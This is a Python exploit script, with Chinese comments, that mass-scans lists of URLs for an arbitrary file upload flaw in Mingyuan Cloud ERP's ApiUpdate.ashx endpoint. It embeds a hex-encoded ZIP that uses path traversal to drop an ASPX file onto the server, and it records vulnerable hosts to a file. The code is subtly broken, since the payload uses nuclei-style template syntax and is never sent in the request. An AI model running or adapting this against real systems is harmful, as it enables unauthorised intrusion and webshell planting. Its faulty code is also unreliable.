# 明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞
#漏洞描述
import requests
import argparse
import sys
from multiprocessing.dummy import Pool

requests.packages.urllib3.disable_warnings()

def main():
    parser = argparse.ArgumentParser(description="明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞漏洞描述")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parser.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip())
        mp = Pool(10)  # 调整为10个线程，视具体情况调整线程数
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")

def poc(target):
    payload = '/myunke/ApiUpdateTool/ApiUpdate.ashx?apiocode=a'
    # url = target + payload
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        # 'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',

    }
    proxies={
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    data="{{hexdec(504B030414000000080063740E576AE37B2383000000940000001D0000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E6173707825CC490AC2401404D0BDA7685A02C9A62F90288A22041C42E2B0FE4A11033DD983E0EDFDE2AEA8575453AC444723C49EEC98392CE4662E45B16C185AE35D48E24806D1D3836DF8C404A3DAD37F227A066723D42D4C09A53C23A66BD65656F56ED2505B68703F20BC11D4817C47E959F678651EAA4BD06A7D8F4EE7841F5455CDB7B32F504B0102140314000000080063740E576AE37B2383000000940000001D00000000000000000000008001000000002E2E2F2E2E2F2E2E2F666463636C6F75642F5F2F746573742E61737078504B050600000000010001004B000000BE0000000000)}}"
    try:
        res = requests.get(url=target, verify=False, timeout=10)
        if res.status_code == 200:
            response = requests.post(url=target+payload, headers=headers, verify=False, timeout=5,proxies=proxies)
            if response.status_code == 200 and 'Message' in response.text:
                print(f"[+] 该网址存在明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞: {target}")
                with open('result.txt', 'a') as f:
                    f.write(target + '\n')
            else:
                print(f"[-] 该网址不存在明源云 ERP系统 接口管家 ApiUpdate.ashx 任意文件上传漏洞: {target}")
        else:
            print(f"[*] 无法访问目标网址: {target}")
    except Exception as e:
        pass

if __name__ == '__main__':
    main()